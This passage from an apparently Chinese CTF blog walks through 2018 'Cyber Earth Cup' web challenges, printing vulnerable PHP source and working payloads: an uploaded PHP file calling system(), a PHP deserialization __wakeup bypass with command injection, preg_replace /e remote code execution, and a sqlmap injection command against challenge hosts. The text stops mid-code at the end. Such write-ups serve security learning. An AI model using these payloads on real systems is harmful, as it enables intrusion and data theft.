class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line">cd ./uploaded</span><br><span class="line">find ./ -size +<span class="number">1</span>M  xargs rm</span><br><span class="line">cd ../</span><br><span class="line">unzip -o ./uploaded<span class="comment">/*.zip -d ./uploaded/</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/*.zip</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/*.*</span></span><br><span class="line"><span class="comment">rm -rf ./uploaded/.*</span></span><br><span class="line"><span class="comment">cd ./uploaded</span></span><br><span class="line"><span class="comment">find -type d  xargs rm -rf</span></span><br><span class="line"><span class="comment">touch /var/www/html/includes/uploaded/index.php</span></span><br><span class="line"><span class="comment">chmod 000 /var/www/html/includes/uploaded/index.php</span></span><br></pre></td></tr></table></figure><p>这个脚本会删除带.的文件而且会删除目录文件,最后创建一个index.php,但不给权限 那我们创建一个123,里面写一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag/flag/flag/flag/flag/flag/flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>压缩成1.zip,上传,抓包改type为application/zip,然后上传和解压成功,之后就是包含这个文件拿flag了,index里面有包含的部分,但是那里对upload进行了检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$page</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;uploaded&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no uploaded uploaded uploaded uploaded !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;://f&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ://f ://f ://f&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;ata&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ata ata ata&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no 0 0 0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;File is not exit &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用的是stripos,这个函数返回的是字符串第一次被匹配到的位置,但注意,字符串是从0开始记的,所以我们构造一个http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/123 那么就可以绕过了,包含之后拿到flag 因为没有环境,都是参考的别人的wp,主要是理解一下吧.... <a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/" title="dalao博客看这里">dalao博客看这里</a></p><h4 id="请关注工控云管理系统的警告记录">请关注工控云管理系统的警告记录</h4><h5 id="参与工控云管理系统警告记录的活动可能奖励你一个flag">参与工控云管理系统警告记录的活动，可能奖励你一个flag</h5><h5 id="http47.104.166.18320008">http://47.104.166.183:20008</h5><p>题目给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>])) &#123;</span><br><span class="line">       <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$selfdir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$selfdir</span>)) &#123;</span><br><span class="line">     <span class="keyword">die</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$secret</span> = <span class="string">&#x27;/var/www/html/hackme/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;cetcrce&quot;</span> . <span class="variable">$selfdir</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">   @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;hackme&#x27;</span>);</span><br><span class="line">   @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$secret</span>);</span><br><span class="line">   @<span class="title function_ invoke__">chdir</span>(<span class="variable">$secret</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">   &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>])) &#123;</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$secret</span>);</span><br><span class="line">       @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;touch /var/www/html/hackme/index.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题是hitcon17的babyfirst的一道改编题,多出来一个waf,具体内容未知,然后curl被ban掉了,直接写一个shell上去,多次写,具体方案我后续会写一篇hitcon17的babyfirst,里面差不多就有答案 ....... 关于waf的问题..由于没有环境测试..暂时留一份大佬的wp,以后参考吧...这里就不放出了</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>赛博地球杯web(非waf篇</title>
      <link href="/2018/01/22/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AFweb%E9%9D%9Ewaf%E7%AF%87/"/>
      <url>/2018/01/22/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AFweb%E9%9D%9Ewaf%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>emmmm,就看着dalao们打...我全程划水...感觉还是题目见得少,多看一看多总结总结吧...还有..乖乖姐姐太强了!</p><h4 id="大量设备报表不见了签道题">大量设备报表不见了（签道题）</h4><h5 id="云平台报表中心收集了设备管理基础服务的数据但是数据被删除了只有一处留下了入侵者的痕迹">云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</h5><h5 id="http120.27.14.7320006"><a href="http://120.27.14.73:20006/" title="http://120.27.14.73:20006/">http://120.27.14.73:20006/</a></h5><p>这个题其实没啥意思....看了半天都不知道怎么写,后来叶姐姐扫id扫到2333发现的flag...我就很无语... flag{2333_bao_pO_OOOO0o_o0OOO}</p><h4 id="工控系统的敏感消息遭泄漏">工控系统的敏感消息遭泄漏</h4><h5 id="云平台消息中心泄漏了不该泄漏的消息导致系统可以被入侵">云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。</h5><h5 id="http47.104.99.23120003"><a href="http://47.104.99.231:20003/" title="http://47.104.99.231:20003/">http://47.104.99.231:20003/</a></h5><p><img src="/images/2018/01/1.png" alt="blacsheep" /> 发现.git泄漏,githack拿源码 <img src="/images/2018/01/2.png" alt="blacsheep" /> index2.php的主要代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;welcome/nothing.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line"><span class="variable">$ad</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;ad&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ad</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">ereg</span>(<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$ad</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Sorry ! Again !&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$ad</span>, <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$secret</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$secret</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Sorry ! You must have --&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;Welcome&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;welcome/welcome.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./import/<span class="subst">$file</span>.php&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;The file does not exit !&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./import/<span class="subst">$file</span>.php&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Something was wrong ! But it is ok! ignore it :)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;sleep.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;wakeup.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;wakeup.txt&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;sleep.txt&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;Welcome&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./import/<span class="subst">$this</span>-&gt;file.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;?php Something destroyed ?&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title class_">Record</span>(<span class="string">&#x27;Welcome&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意到import文件夹,然后在import文件夹里面发现了Flag.php,看了一下源码,发现flag是在注释里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//$flag = &quot;flag&#123;xxxxxxxxxxxxx&#125;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Flag is !&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以直接去执行Flag.php还不行,必须读到源码才可以 回头看一下源码 file和id不管,没啥用,<span class="math inline">\(ad可以用%00过,所以\)</span>ad=123%00-- 然后secret这里用到反序列化,但是涉及到一个__wakeup的问题,这里可以改变属性值绕过,所以写个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Record</span>(<span class="string">&quot;Flag.php &amp;&amp; echo `cat /var/www/html/import/Flag.php`&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>得到序列化后的值:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Record&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;Flag.php &amp;&amp; echo `cat /var/www/html/import/Flag.php`&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后把record后面的1改成10(绕过__wakeup),传参的时候记得urlencode一下,也就是 O%3A6%3A%22Record%22%3A10%3A%7Bs%3A4%3A%22file%22%3Bs%3A52%3A%22 Flag.php+%26%26+echo+%60cat+%2Fvar%2Fwww%2Fhtml%2Fimport%2FFlag. php%60%22%3B%7D 所以去访问一下 <a href="http://47.104.99.231:20003/index2.php?file=Flag&amp;ad=123%00--&amp;secret=O%3A6%3A%22Record%22%3A10%3A%7Bs%3A4%3A%22file%22%3Bs%3A52%3A%22Flag.php+%26%26+echo+%60cat+%2Fvar%2Fwww%2Fhtml%2Fimport%2FFlag.php%60%22%3B%7D" title="flag!">flag!</a> 看源码拿flag.jpg $flag = "flag{g_i_i_t_is_unsafe_ahhhahahah}</p><h4 id="工控云管理系统设备维护中心被植入后门">工控云管理系统设备维护中心被植入后门</h4><h5 id="其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统">其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</h5><h5 id="http47.104.74.20920005"><a href="http://47.104.74.209:20005" title="http://47.104.74.209:20005">http://47.104.74.209:20005</a></h5><p>首先看到http://47.104.74.209:20005/index.php?page=index 然后猜想有文件包含,然后读一下 http://47.104.74.209:20005/index.php? page=php://filter/read=convert.base64-encode/resource=index.php 拿到源码 发现有个preg_replace的后门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个利用就是replace的pattern后面如果有/e的话,replacement的语句是会得到执行的,所以我们就 直接pat=/test/e&amp;rep=system("ls")&amp;sub=test发现一个 s3chahahaDir 那继续pat=/test/e&amp;rep=system("cd+s3chahahaDir+%26%26+ls")&amp;sub=test发现一个flag文件夹,继续进入flag文件夹发现一个flag.php 然后我们 pat=/test/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=test 拿到flag $flag = 'flag{SecuriTY_Preg_eee3}</p><h4 id="工控管理系统新版本">工控管理系统新版本</h4><h5 id="云工控管理系统新添加的登录和注册页面存在漏洞请找出flag">云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。</h5><h5 id="http47.104.1.17320004"><a href="http://47.104.1.173:20004/" title="http://47.104.1.173:20004/">http://47.104.1.173:20004/</a></h5><p>这个题密码找回页面存在注入 sqlmap跑 sqlmap -u http://47.104.1.173:20004/findpwd.php --data "username=inject_here" --dbs 然后balabala的就跑出来了 然后去注册同名用户即可登录拿到flag</p><h4 id="工控云管理系统项目管理页面解析漏洞">工控云管理系统项目管理页面解析漏洞</h4><h5 id="这个工控云管理系统的解析漏洞要靠管理员去修补">这个工控云管理系统的解析漏洞要靠管理员去修补。</h5><h5 id="http47.104.156.3220007"><a href="http://47.104.156.32:20007" title="http://47.104.156.32:20007">http://47.104.156.32:20007</a></h5><p>这个题给出了源码,主要部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+\.ph(p[3457]?ttml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span 